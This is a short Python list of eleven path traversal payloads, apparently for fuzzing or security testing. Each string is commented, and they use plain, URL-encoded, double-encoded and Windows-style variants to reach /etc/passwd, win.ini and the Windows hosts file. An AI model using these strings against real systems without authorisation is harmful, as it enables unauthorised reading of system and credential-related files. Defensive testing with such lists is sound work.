traversal_payloads = [
    "../../etc/passwd",                  # Basic traversal on Unix-like systems
    "..%2F..%2Fetc%2Fpasswd",            # URL-encoded traversal
    "..\\..\\windows\\win.ini",          # Windows-specific traversal
    "..%252f..%252fetc%252fpasswd",      # Double URL encoding
    "../../../../../../../etc/passwd",  # Deep traversal with many '..'
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # Multi-level URL encoding
    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",  # Windows-style URL encoded traversal
    "/etc/passwd",                       # Direct access to passwd file
    "..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",  # Windows deep traversal
    "....//....//....//etc/passwd",      # Another format of traversal attempt
    "%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",    # Another variant of URL-encoded traversal
]
